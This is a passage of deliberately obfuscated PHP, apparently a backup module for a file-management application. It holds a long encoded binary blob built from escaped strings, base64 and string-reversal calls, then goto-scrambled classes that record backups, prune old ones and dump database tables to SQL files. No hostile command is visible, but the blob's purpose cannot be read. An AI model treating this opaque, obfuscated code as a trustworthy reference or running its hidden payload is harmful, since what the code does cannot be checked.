71\332\76\235\160\373\214\163\37\212\134\327\235\372\364\306\257\115\377\77\315\175\125\37\175\366\312\271\315\201\315\157\174\367"."\310\216\155\63\106\357\234\265\155\225\375\253\31\17\136\163\366\334\314\325\203\337\175\141\305\167\103\257\170\254\152\356\320\321\333\342\231\207\66\137\167\377\232\377"."\xbe\xbf\x61\x41\xcf\xfa\xd8\x37\xf\x87\xd7\xed\x19\xb9\xeb\xc1\x8a\x35\xf7\xee\xf9\x2c\xb2\x79\xad\xdd\x58\x14\xbb\xf0\xc4\xdd\xf7\xec\x9f\xf8\x87\xed\x8b\x3e\x2a\xdf\xb2\x72".base64_decode('5LqNi0cN3n7Ynu+39C0//M1ex27lqlVD5xpLQ68+//Wo4YGtJ506c6PtsbI=').base64_decode('UQf2HlG+Zdzcs0Y8sfSJF6/9OBab/Me1T/35w3/uG3HuGdNeDgaCt9wy+fM=')."\107\316\270\342\324\151\333\156\61\226\154\374\317\121\165\27\364\174\373\331\337\237\135\362\376\256\355\217\153\337\234\171\346\31\247\307\153\46\367\275\363\137\137\66"."\x1e\xfa\xe0\xe3\xa7\xdf\x4c\x2c\xb\xdd\x7c\xfc\x53\x87\x7e\x3c\xfa\xcc\xde\x43\x99\x51\x7\x57\x5f\x39\x77\xc6\xbf\x93\x1b\x6\xa5\xdf\x5c\x37\xe3\xc8\xce\x2f\xcc\xf\x47\x56"."\111\115\135\53\317\171\50\173\342\363\227\237\123\321\263\262\342\201\335\247\155\314\325\56\117\355\374\307\333\137\174\177\325\363\247\174\173\150\353\175\17\147\33\35"."\xc1\xe0\xce\xeb\x9f\xac\x6e\xe\xbc\xfa\xc5\xb9\xbf\xb\x3d\x77\xd0\x1f\xc\xed\x69\x59\x53\x75\xfd\xed\x65\xe7\x6c\x5b\x10\x7b\x6b\xc2\x67\xf7\x7e\xfa\xd6\x91\x57\x2c\xce\x3d"."\x3c\x7d\xf6\xde\x3f\x6e\x9b\xf9\xe8\x9b\xc3\x4f\xee\xff\xf9\xfb\x8e\xc1\xf6\x1f\x2e\x3d\xf6\x93\x13\x23\x9b\xee\x38\xf0\xe7\xcb\xc7\xcd\x7d\x70\xb9\xba\xf7\xd2\xe3\x6f\x38\x7c"."\375\240\113\32\156\253\376\303\245\107\34\130\120\76\351\324\325\227\47\157\170\273\354\343\305\163\76\124\107\155\273\260\141\305\216\233\235\235\261\313\336\173\361\213"."\276\35\237\255\375\315\245\307\76\143\174\332\373\367\323\133\162\217\375\351\375\167\306\165\244\372\366\310\253\137\151\153\71\55\160\134\303\303\217\317\111\277\361\310".base64_decode('C6tnPHrMA2/cs/zROz8Jx/Y//+1hnvknjB7yyiBt2h9H/63qgcdmth3VUXU=').base64_decode('e/3guW3H33G6VvaiedLg1+544K65U+dGrnxq+NUHD46Y67mkfLKRH6UM7m8=').base64_decode('PfX4rWsPzP3gy493PiOfduDy/6478N6ID/ND/9N+YbDqq395Wn57zYEtf6k=').strrev('®kπÔæ_mŸãÊˆ«≠≥=oπ«u~∂c¥ÿç¶;∑˝πûó∏˝˝o∑_£ ÌW')."\363\234\57\327\334\360\356\315\152\103\170\320\165\247\171\117\272\151\364\127\223\376\362\373\207\37\273\363\322\216\105\351\246\257\236\236\325\376\174\315\244\276\23\356".base64_decode('W+7VbrrrXzUbr8x/8NmOj3/0f2GsuaXl23Of395/wajnH3r762Depjxx6zc=').base64_decode('d7226wrn998kvj70w52HPtz1xdMffHhJ3f6mTz9/Ivf4O7sO/vzFxr8f/Pw=')."\353\320\263\235\241\145\127\36\374\372\251\237\67\34\372\342\347\57\336\322\56\371\257\272\105\137\175\156\354\330\331\327\372\346\267\33\236\76\64\346\265\251\47\5"."\116\372\344\231\341\373\337\136\245\116\71\155\372\363\267\57\72\255\141\377\315\313\312\16\314\372\343\323\303\215\25\143\257\71\353\252\5\107\264\172\207\74\174\303".base64_decode('qFNHvTr201lTpkSv2O/v2b9Nz45MzGwbvWbHS7+dlzS6f9hrD69O3f235vs=')."\137\377\333\361\113\137\71\265\355\257\67\365\334\365\356\273\327\157\71\375\212\362\216\215\57\277\122\76\374\330\63\307\216\171\357\221\367\36\172\157\323\364\357\267"."\67\125\67\77\171\332\226\173\47\365\124\74\375\336\7\321\41\31\337\217\207\226\57\321\57\375\162\176\377\363\233\166\145\117\134\363\334\220\262\175\316\107\63\353".base64_decode('JiUPqYPu9Vw246KnDnoCR01vlP9d5/vgyxvKf021SvD1K2W5hbfj3RpShzg=').base64_decode('RJUKySBNlihfZZgiB4FEXyD42lAAsSWiPF4aamFLUBbu3J24LC/pjh1KNuQ=').base64_decode('x6N0MLUEjAtG3oaff5RUcFxFR4ePfmvz8Eyn3bDh4dsYB4ArtDEv6zbOw9s=')._kodDe('LDH8uyG6se9T+X5U3l4+lMMaNhHGniIGBwZ6KFR7mF6StTAc0Xp0SUdndHg2').base64_decode('iCRhTOgpoY06bLVhZ942S5lfcCaPJ4aHxdmZlUmNHXf2uaKOj+OFq4kYuv8=')."\x17\x13\xef\x2a\x25\xd2\xe3\x42\xc2\xb5\xf\xab\x59\xf4\xd3\x5f\xa2\x95\xff\x7b\x3f\x64\xeb\xe3\x3d\x94\xab\xd8\x7b\x6\xea\x1d\x51\xb3\x79\x98\x90\x2f\x48\xe6\xa2\xe\x81\xf".strrev('∏#ä*%ƒmiÿ˜</4Iííü3}()3C˝ã˝á«äéwü˛ª'."\r".'')."\xfb\x58\x4a\x11\xc5\x61\x8b\x68\xcc\x84\x61\xdd\xe2\xd\x6\x15\x8d\xa1\xb1\xe\x54\x19\xd2\xc5\x91\x20\x10\xcc\xb9\x8\x6a\x6a\x3c\xc\xb7\x4b\x88\x5d\x1f\x9\x26\x12\x72\x2a"."\145\221\262\101\334\303\304\111\276\345\5\31\263\360\43\27\342\140\310\307\41\30\226\367\55\135\275\373\306\333\326\135\172\15\216\256\174\165\335\77\137\271\354\323".base64_decode('7cR/LhILBhUKBm3h6UOWVB938S5Xz4Wz2x845pm3p+wYtu7tx3513zV3Dhk=').base64_decode('dsYF+Xt2fHfNN288uXvPqmHx49/qr7rz2dhrZw49+r3FK956e2nnZ9Ubh1U=')."\x9c\x70\xfd\x39\x6f\x6f\xd8\x6a\x1f\xf5\xe3\x9f\xcf\x50\xbf\x18\xf2\xee\x81\x6d\x2f\x1d\x7d\xd3\xbe\x6d\xc3\xaf\x1a\x6c\x7c\x5e\xfb\x8f\x95\x93\x86\x4f\xbc\xdc\xb3\x6c\xca\xfe"."\120\74\174\305\201\121\75\43\136\377\363\364\43\337\172\57\176\301\301\271\67\304\33\276\253\351\336\322\366\305\73\352\346\353\62\307\366\330\276\34\62\343\221\246"."\x17\xf2\x1b\x67\x87\xf3\x2b\x5e\xb1\xdd\xf6\xee\x9c\xb1\xab\x76\xac\x37\xb7\xde\xb2\xeb\xfb\xc7\x8e\x9f\xf4\xfc\xf7\x2b\x87\xde\x77\xac\x7f\xc3\xb5\x91\x3b\xaf\xba\x60\xb6\xf1"."\x8f\xc4\xa2\xc0\x47\xd1\x6d\xec\x83\xeb\xff\xab\xf\x6d\xf0\x4f\x85\xf0\x6f\x6e\xc\x39\xe6\x98\x5f\xfe\xec\x6\x72\xa3\xf0\xb\x74\x59\x7c\x91\xe\xab\x66\x2e\x2e\x4c\xb9\x93".strrev('¡	ûÃ°}‘Ö?Q<Œ(ˆuéP]_ëâfŒ+%LF9U_àpéY—p∆ﬁ=')."\x57\x4d\x4c\xc9\x84\x35\xee\x74\x1d\x5b\xbf\xa8\x2\x4\x63\x7e\xfd\x21\x7a\x11\x4b\xb7\xcb\xba\x3\x2c\xda\x6e\x53\xa3\x5f\x88\x28\x11\x29\x1e\x35\x3f\x92\x13\x99\xee\x94\xaa".strrev('¯ŒGÊ¯ã>´rµ¯qƒ)8q∑?bÙU`{≈#yGâ8%˚eÊÉ1	Ã√')."\xb9\xda\xc8\x46\xb4\x42\x36\xa6\xb\x12\x4\x77\xa4\x22\x83\xdb\xd3\x2e\x56\x8d\x35\x3e\xd8\x54\x9\xaa\x6a\x22\x50\xab\xe2\x18\x60\x2d\x94\x5e\x89\xf4\xeb\x2e\xa2\x92\x0\x84"."\xc4\xef\xf6\x8c\x1c\x10\x33\x74\x91\x33\xfd\x8f\xf0\xc2\x5f\xb8\x3b\x2d\xfa\x66\x90\xa9\x59\xaa\x1\xc\x9b\x70\xff\x87\xdd\xe4\xe2\x2f\x16\x40\x1f\x9f\x6a\xca\x26\x45\x9b\x3"."\x15\xc8\xd1\x6\x4\xa0\x47\x4d\xc8\xd5\xe2\x1c\xf2\xd\x8a\x39\xd2\x10\x49\xf8\x7\x3b\xdc\xac\x80\xc9\xb0\x92\x39\x92\x2f\xc8\xdd\x9f\x57\x4a\xdc\x51\xa4\xf8\x1d\x6\xa8\x2e"."\x6f\xd0\xd8\xa2\xb2\xba\xe\x32\xe4\x1e\xc5\xad\xe9\x46\x4c\xcd\x19\x3\xa5\xb\x47\xb8\xe0\x1d\x70\x3a\xff\x20\x3c\x66\x29\x59\x19\x82\x6c\xf1\xd3\x23\xd6\x4a\xc1\xdc\x46\x39"."\136\254\37\164\50\374\220\3\322\100\353\350\176\225\374\320\131\100\46\244\42\110\120\126\303\147\64\126\115\47\112\104\140\352\54\227\324\40\134\261\131\257\75\231"."\xe3\xff\xa2\x4d\x9c\x57\xfd\x42\x32\x2a\x45\x3e\xf6\xe\x7f\xa1\xbf\x20\xe4\x20\x46\x48\xc6\xd7\x6\xae\x1e\x99\x59\x55\x16\x96\x6a\xb6\xb0\x63\xc2\xd5\x68\x12\xad\x37\xce\x84"."\242\202\360\203\230\350\217\53\247\26\226\60\273\124\75\125\317\276\230\311\363\347\263\374\73\232\74\73\374\266\137\51\60\140\70\112\320\261\16\271\207\137\241\161"."\216\52\225\152\220\173\112\144\145\137\366\144\120\0\141\131\21\237\40\220\54\356\22\104\351\25\311\74\311\327\121\334\35\230\261\30\212\261\135\170\11\15\107\205".strrev('çyË<Ä˙¬“h+Iº'."\0".'âë˜,‹ß(*ÈU≈˚Éó\\˝eE∞z»árÓ*Çˆ')."\335\2\55\360\131\2\51\147\254\220\217\25\274\300\321\64\353\345\250\50\223\130\46\334\57\124\47\136\234\16\130\40\132\272\21\276\52\255\50\216\26\134\327\26"."\x90\x45\x9e\x99\xb0\x96\x96\x9a\x2d\x44\x93\xd\x96\xe4\x8c\x88\x89\x96\x2e\x16\x4e\x37\xe2\x88\xf9\x5a\xc5\xc0\xc\x52\x3d\xe3\x34\x97\x35\x9\xe7\x57\xa\x46\x24\x16\x28\x1c".strrev('yæä XÃŒI`ìÜ,ï‡ %iàò¥(~Qº	FÖeat›)îå·°.-')."\x31\xf8\x81\x1a\x63\x80\x1e\x16\x8f\x1f\xed\x8e\x82\xd1\x93\x3e\x73\x8f\x40\x42\xd6\x81\x50\x52\x32\x73\x71\x73\x64\xfe\xb\x73\x23\x29\xaf\x74\x2f\x4a\x8a\xab\x3\xf5\xa2\x64".strrev('à÷∂îb⁄,î^vbƒhßáxÇ|¬VûPì,çÑî—ÃäQhúZ˘a{Ê')."\x94\xdc\x88\x86\xd5\x8c\xa2\x0\x2e\x22\x86\xda\xf3\xed\x59\x76\xf1\xbe\x27\x56\xf9\xc2\x12\xd\x88\x60\xb\xe1\xcd\x67\xbb\xb3\xf4\xd3\xb5\xa0\x5\xfe\x92\x9f\xb5\x82\xa3\x59"."\65\331\55\110\225\205\216\101\350\372\314\346\5\277\23\320\10\16\207\220\366\11\176\213\67\51\130\140\101\240\350\3\4\247\133\114\40\124\370\61\12\146\245\140"."\xb9\x92\x2f\x91\xee\xe0\x2a\x28\xd1\x55\x8b\xc5\x6b\xc\xcc\xc2\xef\x33\xf1\x29\x4a\x14\x74\xe4\xa7\xbe\x1f\x8e\xd3\x86\x4f\x24\x7c\xb9\x18\xd5\x74\xd3\x6\xd3\x62\x5a\xe\xfd".base64_decode('1mumyRxFczEKlUDsFDxebIIxBgjxL2PB1YQUg2hZoe2PguQ+EwoBUQWnIpI=')."\x62\x89\x40\x85\x23\x8b\x88\xa7\x47\xb7\x96\x6a\xd7\xfa\xc8\x7c\x20\x3f\x66\xbc\x35\x2e\xd0\xc8\x85\xc\x11\x77\xf\x46\x56\x84\x68\x38\x82\x8c\xc\xd\x27\x4e\x71\x92\x37\x41".base64_decode('dlSHnTip5Ra4uDj+5BVz9vBLNRCFEK8CO8BHnsTYN9ijRUlhVzTaEop48PM=')."\201\242\144\374\345\166\156\245\123\224\24\156\12\5\7\112\363\6\134\76\177\121\32\264\332\201\217\32\250\243\144\234\344\13\243\136\272\374\176\152\332\133\334\13"."\237\173\32\357\11\272\62\346\42\136\256\113\313\12\113\124\60\116\243\272\310\250\114\137\140\101\102\314\76\172\46\204\205\317\227\13\325\131\67\253\70\345\6\165"."\xbe\xcd\x2\xd6\xf\x55\x89\x87\x11\x5d\xa6\x38\x6\xbf\x20\xc0\xb6\x2d\xe3\x27\xd1\x90\x44\x13\x3c\xfc\x1\x15\x21\x11\x1f\xd9\x96\xab\x74\x1\x8e\x36\x6\x54\x2b\xd9\x84\x25".base64_decode('WdgJB3keUKC+Lv4+tCXCQ4LNYsEU8FCBetFy0y2c6wNcnnNkQ+ycpxHLsrk=')."\132\273\240\154\304\222\207\107\174\130\47\332\140\341\260\45\31\171\373\142\224\52\246\305\344\116\102\244\40\57\301\143\365\375\142\130\324\147\220\7\223\100\356\105"."\x64\xa\x13\xa7\x42\x43\x1c\xc1\x3c\x4\x4e\xc5\xff\x3\xfc\x8e\xe4\xc9\x4f\x91\x0\x0".base64_decode('').""."".""."", 10, -8))); goto e∫ªÎÇÇÎ; D—”˜‡«´„: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $fäïÓ≠ó˘· =& $_SERVER[∞„˜ƒÑºª]; self::$name = date($fäïÓ≠ó˘·[443]); if (!($EÌ∂ÖâÀı® = Model($fäïÓ≠ó˘·[444])->lastItem())) { $EÌ∂ÖâÀı® = $this->initData(); } else { self::$name = $EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[28]]; if ($EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[445]] == $fäïÓ≠ó˘·[376]) { self::$name = date($fäïÓ≠ó˘·[446]); $Cì´ïúπ¯œ = 0; if (isset($EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[280]][$fäïÓ≠ó˘·[163]][$fäïÓ≠ó˘·[382]])) { $Cì´ïúπ¯œ = (int) $EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[280]][$fäïÓ≠ó˘·[163]][$fäïÓ≠ó˘·[382]]; } if ($EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[28]] == self::$name) { Model($fäïÓ≠ó˘·[444])->remove($EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[366]]); } $EÌ∂ÖâÀı® = $this->initData($Cì´ïúπ¯œ, $EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[447]]); } else { $this->checkStore($EÌ∂ÖâÀı®[$fäïÓ≠ó˘·[447]]); } } self::$option = $EÌ∂ÖâÀı®; } private function initData($cœìæå’∑† = 0, $e”ÓÒ¶Ëﬂ  = '') { goto dﬁÂëÜÑ∏µ; cÿ‹ªµãü÷: $this->checkStore($F¬ÛãΩäÕú[$Dôäë˜ºá—[447]]); $e¨ÒêÔ¨èŸ = array($Dôäë˜ºá—[447] => $F¬ÛãΩäÕú[$Dôäë˜ºá—[447]], $Dôäë˜ºá—[28] => self::$name, $Dôäë˜ºá—[445] => 0, $Dôäë˜ºá—[448] => $F¬ÛãΩäÕú[$Dôäë˜ºá—[448]], $Dôäë˜ºá—[280] => array($Dôäë˜ºá—[449] => array($Dôäë˜ºá—[445] => 0), $Dôäë˜ºá—[450] => array($Dôäë˜ºá—[445] => 0, $Dôäë˜ºá—[451] => 0, $Dôäë˜ºá—[452] => 0, $Dôäë˜ºá—[29] => $Dôäë˜ºá—[33]), $Dôäë˜ºá—[453] => array($Dôäë˜ºá—[445] => 0, $Dôäë˜ºá—[451] => 0, $Dôäë˜ºá—[452] => 0), $Dôäë˜ºá—[163] => array($Dôäë˜ºá—[445] => 0, $Dôäë˜ºá—[454] => 0, $Dôäë˜ºá—[455] => 0, $Dôäë˜ºá—[456] => 0, $Dôäë˜ºá—[457] => 0, $Dôäë˜ºá—[382] => $cœìæå’∑†)), $Dôäë˜ºá—[458] => time(), $Dôäë˜ºá—[459] => 0); $bà€ÊÌ¨∂› = Model($Dôäë˜ºá—[444])->insert($e¨ÒêÔ¨èŸ); goto aè⁄Éô—†∫; aè⁄Éô—†∫: $e¨ÒêÔ¨èŸ[$Dôäë˜ºá—[366]] = $bà€ÊÌ¨∂›; return $e¨ÒêÔ¨èŸ; goto c´ñ·ÜÁÜ; dﬁÂëÜÑ∏µ: $Dôäë˜ºá— =& $_SERVER[∞„˜ƒÑºª]; $F¬ÛãΩäÕú = Model($Dôäë˜ºá—[444])->config(); if ($e”ÓÒ¶Ëﬂ  && $F¬ÛãΩäÕú[$Dôäë˜ºá—[447]] != $e”ÓÒ¶Ëﬂ ) { $cœìæå’∑† = 0; } goto cÿ‹ªµãü÷; c´ñ·ÜÁÜ: } private function checkStore($Aü˜úﬂçû◊) { $CÈÑ‰Òµª =& $_SERVER[∞„˜ƒÑºª]; $A‘”ÀˆﬁﬁÕ = Model($CÈÑ‰Òµª[460])->listData($Aü˜úﬂçû◊); Model($CÈÑ‰Òµª[460])->checkConfig($A‘”ÀˆﬁﬁÕ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[∞„˜ƒÑºª][444])->findByName(self::$name); } return self::$option; } public static function set($d°åﬂŸ≠Ø›) { $AÉ≠∫∫–â≈ =& $_SERVER[∞„˜ƒÑºª]; $D∑¥‡€ ¿◊ = self::get(); foreach ($d°åﬂŸ≠Ø› as $bÙáµÃ§ŒΩ => $e”ƒ”ˆî∑ﬂ) { $fÚÃ±Ãƒƒ∑ = explode($AÉ≠∫∫–â≈[98], $bÙáµÃ§ŒΩ); $d¿ôá≠®÷£ = count($fÚÃ±Ãƒƒ∑); switch ($d¿ôá≠®÷£) { case 1: $D∑¥‡€ ¿◊[$fÚÃ±Ãƒƒ∑[0]] = $e”ƒ”ˆî∑ﬂ; break; case 2: $D∑¥‡€ ¿◊[$fÚÃ±Ãƒƒ∑[0]][$fÚÃ±Ãƒƒ∑[1]] = $e”ƒ”ˆî∑ﬂ; break; case 3: $D∑¥‡€ ¿◊[$fÚÃ±Ãƒƒ∑[0]][$fÚÃ±Ãƒƒ∑[1]][$fÚÃ±Ãƒƒ∑[2]] = $e”ƒ”ˆî∑ﬂ; break; } } Model($AÉ≠∫∫–â≈[444])->update($D∑¥‡€ ¿◊[$AÉ≠∫∫–â≈[366]], $D∑¥‡€ ¿◊); self::$option = $D∑¥‡€ ¿◊; return self::$option; } public function keep() { $CÇÕ˘£éØœ =& $_SERVER[∞„˜ƒÑºª]; $D≈∫õÍÀÛË = self::get(); if ($D≈∫õÍÀÛË[$CÇÕ˘£éØœ[280]][$CÇÕ˘£éØœ[449]][$CÇÕ˘£éØœ[445]] == $CÇÕ˘£éØœ[376]) { return; } $this->backupKeep($D≈∫õÍÀÛË); self::set(array($CÇÕ˘£éØœ[461] => 1)); } private function backupKeep($Dß¶∂™≥≤†) { goto e˘¯à˜ÿÏ˜; e˘¯à˜ÿÏ˜: $dÔë˜’Œé¯ =& $_SERVER[∞„˜ƒÑºª]; $A«âÉ≠ÊæÊ = Model($dÔë˜’Œé¯[444])->listData(); if (empty($A«âÉ≠ÊæÊ)) { return; } goto bË‹∑‰ÆÂÉ; bË‹∑‰ÆÂÉ: $dÖ÷≥¢®‚£ = array(); for ($FØÇóï„†ê = 0; $FØÇóï„†ê <= 7; $FØÇóï„†ê++) { $dÖ÷≥¢®‚£[] = date($dÔë˜’Œé¯[446], strtotime("\x2d{$FØÇóï„†ê}\x20\x64\141\x79\163")); } for ($FØÇóï„†ê = 0; $FØÇóï„†ê < 12; $FØÇóï„†ê++) { $dÖ÷≥¢®‚£[] = date($dÔë˜’Œé¯[462], strtotime("\x2d{$FØÇóï„†ê}\40\155\157\x6e\x74\150\163")); } goto e˜°ïÆ∆èô; e˜°ïÆ∆èô: $dÖ÷≥¢®‚£ = array_unique($dÖ÷≥¢®‚£); foreach ($A«âÉ≠ÊæÊ as $eÆÛãÍÙñÒ) { if (!empty($eÆÛãÍÙñÒ[$dÔë˜’Œé¯[28]]) && in_array($eÆÛãÍÙñÒ[$dÔë˜’Œé¯[28]], $dÖ÷≥¢®‚£)) { continue; } Model($dÔë˜’Œé¯[444])->remove($eÆÛãÍÙñÒ[$dÔë˜’Œé¯[366]]); $cﬁ°¥Œî´® = "\173\151\157\72{$Dß¶∂™≥≤†[$dÔë˜’Œé¯[447]]}\175\57\x64\141\164\x61\142\x61\163\145\x2f\x62\141\x63\x6b\165\x70\x5f{$eÆÛãÍÙñÒ[$dÔë˜’Œé¯[28]]}"; IO::remove($cﬁ°¥Œî´®, !1); } goto d£˘ÁÉ±Œ¥; d£˘ÁÉ±Œ¥: } public function db() { goto b—•œó‘ƒ›; AﬁÿùŒÛèã: return !0; goto EÃ°œÏòäà; Bœò≤©ãÆ≠: $Cááàö∑êÜ = new BackupDb(); if (!$Cááàö∑êÜ->index()) { return !1; } self::set(array($Cà¨≤ìÌˆ•[463] => 1)); goto AﬁÿùŒÛèã; b—•œó‘ƒ›: $Cà¨≤ìÌˆ• =& $_SERVER[∞„˜ƒÑºª]; $Då‘‰Ç∫òÔ = self::get(); if ($Då‘‰Ç∫òÔ[$Cà¨≤ìÌˆ•[280]][$Cà¨≤ìÌˆ•[450]][$Cà¨≤ìÌˆ•[445]] == $Cà¨≤ìÌˆ•[376]) { return !0; } goto Bœò≤©ãÆ≠; EÃ°œÏòäà: } public function dbFile() { goto eÜÔ›ﬂÑæè; F¯Ëﬁ®®§: return !0; goto B”‹±†áÕ¶; fÈèâﬂíúí: $FœòöïÔß™ = new BackupDbFile(); if (!$FœòöïÔß™->index()) { return !1; } self::set(array($Cöò´˜á¥ﬁ[464] => 1)); goto F¯Ëﬁ®®§; eÜÔ›ﬂÑæè: $Cöò´˜á¥ﬁ =& $_SERVER[∞„˜ƒÑºª]; $AöçóàÿßÜ = self::get(); if ($AöçóàÿßÜ[$Cöò´˜á¥ﬁ[280]][$Cöò´˜á¥ﬁ[453]][$Cöò´˜á¥ﬁ[445]] == $Cöò´˜á¥ﬁ[376]) { return !0; } goto fÈèâﬂíúí; B”‹±†áÕ¶: } public function file() { $Aö›ı«ÇÀ« =& $_SERVER[∞„˜ƒÑºª]; $aÎ¢ö∑±àÎ = self::get(); if ($aÎ¢ö∑±àÎ[$Aö›ı«ÇÀ«[280]][$Aö›ı«ÇÀ«[163]][$Aö›ı«ÇÀ«[445]] == $Aö›ı«ÇÀ«[376]) { return !0; } if (!isset($aÎ¢ö∑±àÎ[$Aö›ı«ÇÀ«[448]]) || $aÎ¢ö∑±àÎ[$Aö›ı«ÇÀ«[448]] == $Aö›ı«ÇÀ«[402]) { $D®íï©®≤¨ = new BackupFile(); if (!$D®íï©®≤¨->index()) { return !1; } } self::set(array($Aö›ı«ÇÀ«[465] => 1, $Aö›ı«ÇÀ«[445] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto B…îùãÚô¡; B…îùãÚô¡: $C·∫Ú˜∑√« =& $_SERVER[∞„˜ƒÑºª]; $Fµ©ûÆâ˜± = Backup::get(); self::$io = $Fµ©ûÆâ˜±[$C·∫Ú˜∑√«[447]]; goto EÉ“äˆﬁÑƒ; EÉ“äˆﬁÑƒ: self::$name = $Fµ©ûÆâ˜±[$C·∫Ú˜∑√«[28]]; if ($Bÿîﬂã©ì† = $this->sqliteFile()) { return $this->sqliteBackup($Bÿîﬂã©ì†); } $BòÓ¯ı´üÖ = 0; goto eÇæó··Ωå; e±ëµñ´ÔÇ: Backup::set($bÃ„Ã©„Ç‡); return !0; goto f”ñ¶Ò·∑¢; eÇæó··Ωå: $BîÕßÌáÎ… = Model()->db()->getTables(); foreach ($BîÕßÌáÎ… as $F™àﬂ›ßÒ”) { $BòÓ¯ı´üÖ += Model($F™àﬂ›ßÒ”)->count(); } $fÉúÕ÷‰áÖ = new Task($C·∫Ú˜∑√«[466], $C·∫Ú˜∑√«[467], $BòÓ¯ı´üÖ, LNG($C·∫Ú˜∑√«[468]) . $C·∫Ú˜∑√«[469] . LNG($C·∫Ú˜∑√«[470])); goto eàà—•û˘•; eàà—•û˘•: $bÃ„Ã©„Ç‡ = array($C·∫Ú˜∑√«[471] => $C·∫Ú˜∑√«[472], $C·∫Ú˜∑√«[473] => $BòÓ¯ı´üÖ + 1); Backup::set($bÃ„Ã©„Ç‡); $cÌÓÚáìè≤ = 0; goto e«ñ©‡¥Òô; e«ñ©‡¥Òô: $bıå∫Œ¢ÿ∂ = TEMP_FILES . $C·∫Ú˜∑√«[474] . self::$name . $C·∫Ú˜∑√«[8]; del_dir($bıå∫Œ¢ÿ∂); mk_dir($bıå∫Œ¢ÿ∂); goto EØîäÜåŒ≈; EØîäÜåŒ≈: foreach ($BîÕßÌáÎ… as $F™àﬂ›ßÒ”) { $bΩ€ñﬁêÑ∆ = "{$bıå∫Œ¢ÿ∂}{$F™àﬂ›ßÒ”}\56\x73\x71\x6c"; $cÌÓÚáìè≤ += $this->makeSqlFile($F™àﬂ›ßÒ”, $bΩ€ñﬁêÑ∆, $fÉúÕ÷‰áÖ, $Fµ©ûÆâ˜±); } $fÉúÕ÷‰áÖ->end(); $bÃ„Ã©„Ç‡ = array($C·∫Ú˜∑√«[463] => 1, $C·∫Ú˜∑√«[475] => $cÌÓÚáìè≤); goto e±ëµñ´ÔÇ; f”ñ¶Ò·∑¢: } public function makeSqlFile($CËïÒ‰èé¥, $aëù™ÕºêÏ, $B∫éã‰›¬‹, $FÊæüÆîØÙ) { goto fõºö°√›ã; fõºö°√›ã: $B´∏õ«´éù = self::$io; $a±î£ÜÑ·Á = 0; $f–·øè ÂÔ = 1; goto EÂ√‚£§∂é; EÂ√‚£§∂é: $eÛåí∏®∫ = 2000; $Aàê∞‚∏”≈ = fopen($aëù™ÕºêÏ, $_SERVER[∞„˜ƒÑºª][476]); $eΩ¢·∫Ùîﬁ = Model($CËïÒ‰èé¥)->getPk(); goto fã…£éÆ„ ; fã…£éÆ„ : $cÓœ°ﬁÍ™ç = Model($CËïÒ‰èé¥)->getDbFields(); do { $fˆ≥úóüÇà = Model($CËïÒ‰èé¥)->field($cÓœ°ﬁÍ™ç)->order($eΩ¢·∫Ùîﬁ . $_SERVER[∞„˜ƒÑºª][477])->selectPage($eÛåí∏®∫, $f–·øè ÂÔ); $Bã§Â”ä≥ê = !empty($fˆ≥úóüÇà[$_SERVER[∞„˜ƒÑºª][354]]) ? $fˆ≥úóüÇà[$_SERVER[∞„˜ƒÑºª][354]] : array(); $eÌéî¢ûÖö = array(); foreach ($Bã§Â”ä≥ê as $EÇÌÕ÷¨Æê) { if ($CËïÒ‰èé¥ == $_SERVER[∞„˜ƒÑºª][478] && (!isset($FÊæüÆîØÙ[$_SERVER[∞„˜ƒÑºª][448]]) || $FÊæüÆîØÙ[$_SERVER[∞„˜ƒÑºª][448]] == $_SERVER[∞„˜ƒÑºª][402])) { $EÇÌÕ÷¨Æê[$_SERVER[∞„˜ƒÑºª][84]] = str_replace("\x7b\151\157\72{$EÇÌÕ÷¨Æê[$_SERVER[∞„˜ƒÑºª][479]]}\175", "\x7b\151\157\72{$B´∏õ«´éù}\x7d", $EÇÌÕ÷¨Æê[$_SERVER[∞„˜ƒÑºª][84]]); $EÇÌÕ÷¨Æê[$_SERVER[∞„˜ƒÑºª][479]] = $B´∏õ«´éù; } $eÌéî¢ûÖö[] = $_SERVER[∞„˜ƒÑºª][480] . $this->addSqlSlashes($EÇÌÕ÷¨Æê) . $_SERVER[∞„˜ƒÑºª][481]; } if ($bö«£ÿı∂  = count($Bã§Â”ä≥ê)) { $BíË¢ç∂…¨ = "\x49\x4e\123\x45\122\x54\40\111\116\124\x4f\x20\x60{$CËïÒ‰èé¥}\140\40\x28\x60" . implode($_SERVER[∞„˜ƒÑºª][482], $cÓœ°ﬁÍ™ç) . $_SERVER[∞„˜ƒÑºª][483]; fwrite($Aàê∞‚∏”≈, $BíË¢ç∂…¨ . implode($_SERVER[∞„˜ƒÑºª][484], $eÌéî¢ûÖö) . $_SERVER[∞„˜ƒÑºª][76] . PHP_EOL); $B∫éã‰›¬‹->update($bö«£ÿı∂ ); } $f–·øè ÂÔ++; $a±î£ÜÑ·Á += $bö«£ÿı∂ ; } while ($bö«£ÿı∂  == $eÛåí∏®∫); fclose($Aàê∞‚∏”≈); goto A‡ñµ´õëø; A‡ñµ´õëø: return $a±î£ÜÑ·Á; goto F·‰Ñ‡ÏÑ≥; F·‰Ñ‡ÏÑ≥: } private function addSqlSlashes($A¥¢◊õäË‰) { $DÇ“î™¬€® =& $_SERVER[∞„˜ƒÑºª]; $dô‡àßá„ = array(); foreach ($A¥¢◊õäË‰ as $dñÔ¡Çàˆﬂ) { if (is_array($dñÔ¡Çàˆﬂ)) { $dñÔ¡Çàˆﬂ = json_encode_force($dñÔ¡Çàˆﬂ); } $dñÔ¡Çàˆﬂ = addslashes($dñÔ¡Çàˆﬂ); $dñÔ¡Çàˆﬂ = str_replace(array($DÇ“î™¬€®[485], $DÇ“î™¬€®[55]), array($DÇ“î™¬€®[486], $DÇ“î™¬€®[487]), $dñÔ¡Çàˆﬂ); $dô‡àßá„[] = $dñÔ¡Çàˆﬂ; } return $DÇ“î™¬€®[63] . implode($DÇ“î™¬€®[488], $dô‡àßá„) . $DÇ“î™¬€®[63]; } private function sqliteFile() { 